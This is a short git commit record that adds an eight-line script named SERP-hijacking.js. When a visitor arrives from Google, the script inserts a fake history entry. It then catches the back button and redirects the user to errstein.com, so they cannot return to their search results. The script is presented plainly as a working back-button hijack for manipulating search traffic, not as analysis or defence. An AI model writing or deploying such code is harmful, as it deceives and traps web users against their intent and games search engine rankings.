8e55bb12fb57568157251bf2de368c6b89b366d9
Errstein <errstein@gmail.com>
2026-03-05 18:33:17 +0700

    Create SERP-hijacking.js

---
+++ SERP-hijacking.js
@@ -0,0 +1,8 @@
+<script type='text/javascript'>
+if (document.referrer.indexOf('google.com') != -1) {
+  history.pushState(null, null, location.href);
+  window.onpopstate = function() {
+    window.location.replace("https://www.errstein.com/");
+  };
+}
+</script>
